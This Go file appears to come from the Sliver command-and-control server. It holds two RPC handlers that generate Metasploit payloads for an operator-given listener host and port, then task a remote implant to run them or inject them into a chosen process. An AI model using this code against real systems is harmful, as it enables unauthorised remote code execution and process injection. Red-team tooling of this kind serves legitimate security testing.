package rpc

import (
	"sliver/server/core"
	"sliver/server/msf"
	"time"

	clientpb "sliver/protobuf/client"
	sliverpb "sliver/protobuf/sliver"

	"github.com/golang/protobuf/proto"
)

func rpcMsf(req []byte, timeout time.Duration, resp RPCResponse) {
	msfReq := &clientpb.MSFReq{}
	err := proto.Unmarshal(req, msfReq)
	if err != nil {
		resp([]byte{}, err)
		return
	}

	sliver := core.Hive.Sliver(msfReq.SliverID)
	if sliver == nil {
		resp([]byte{}, err)
		return
	}

	config := msf.VenomConfig{
		Os:         sliver.Os,
		Arch:       msf.Arch(sliver.Arch),
		Payload:    msfReq.Payload,
		LHost:      msfReq.LHost,
		LPort:      uint16(msfReq.LPort),
		Encoder:    msfReq.Encoder,
		Iterations: int(msfReq.Iterations),
	}
	rawPayload, err := msf.VenomPayload(config)
	if err != nil {
		rpcLog.Warnf("Error while generating msf payload: %v\n", err)
		resp([]byte{}, err)
		return
	}
	data, _ := proto.Marshal(&sliverpb.Task{
		Encoder: "raw",
		Data:    rawPayload,
	})
	data, err = sliver.Request(sliverpb.MsgTask, defaultTimeout, data)
	resp(data, err)
}

func rpcMsfInject(req []byte, timeout time.Duration, resp RPCResponse) {
	msfReq := &clientpb.MSFInjectReq{}
	err := proto.Unmarshal(req, msfReq)
	if err != nil {
		resp([]byte{}, err)
		return
	}

	sliver := core.Hive.Sliver(msfReq.SliverID)
	if sliver == nil {
		resp([]byte{}, err)
		return
	}

	config := msf.VenomConfig{
		Os:         sliver.Os,
		Arch:       msf.Arch(sliver.Arch),
		Payload:    msfReq.Payload,
		LHost:      msfReq.LHost,
		LPort:      uint16(msfReq.LPort),
		Encoder:    msfReq.Encoder,
		Iterations: int(msfReq.Iterations),
	}
	rawPayload, err := msf.VenomPayload(config)
	if err != nil {
		rpcLog.Errorf("Error while generating msf payload: %v\n", err)
		resp([]byte{}, err)
		return
	}
	data, _ := proto.Marshal(&sliverpb.RemoteTask{
		Pid:     msfReq.PID,
		Encoder: "raw",
		Data:    rawPayload,
	})
	data, err = sliver.Request(sliverpb.MsgRemoteTask, defaultTimeout, data)
	resp(data, err)
}
